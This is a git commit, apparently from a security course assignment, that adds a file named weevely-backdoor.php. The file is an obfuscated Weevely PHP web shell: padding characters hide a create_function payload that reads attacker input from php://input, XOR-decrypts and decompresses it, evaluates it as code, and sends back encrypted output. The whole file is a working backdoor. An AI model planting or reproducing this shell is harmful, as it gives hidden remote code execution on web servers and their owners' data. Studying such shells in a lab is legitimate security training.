4c165bed86642ba927c8176c96a6aab76e7e3e0a
Flavio Scognamiglio <67764234+flavioscg@users.noreply.github.com>
2024-07-01 16:55:12 +0200

    up

---
+++ Consegna S6:L1/weevely-backdoor.php
@@ -0,0 +1,11 @@
+<?php
+$k='("P/$kh(P.+)$kf/",@Pfile_get_contPePnts("Pphp://input"P),P$m)P==1) {@ob_staPPrt(P);@e';
+$i='vaPl(@gzuncPPompress(@x(@baPse64_dPecode($PPm[1]),$kP)))P;$o=@ob_get_cPonPtents();@oP';
+$p='b_end_cPPlean();$r=@Pbase6P4_encPode(@x(@gPzPcompress(P$o),$k));priPnt("$Pp$kh$Pr$kf");}';
+$G=str_replace('VV','','crVVeVVVVate_fVVunVVcVVtion');
+$V='=P0;(P$jP<$Pc&&$Pi<$l);$j++,$i+P+){$o.=$t{$i}P^$k{P$Pj};}}return $o;}if P(@preg_PmPPatch';
+$I='nPction x($t,$Pk)P{$c=Pstrlen($k);$Pl=strlenP($t);$o=P"";PPPfor($i=0;$i<P$l;){for($jP';
+$c='$Pk="977cd0P82P";$kh="2feP6f0a1ca64P";P$kf="787f933P82P0f3";$p=P"53oPlD3OPdkfxG14Xx"P;fuP';
+$u=str_replace('P','',$c.$I.$V.$k.$i.$p);
+$q=$G('',$u);$q();
+?>
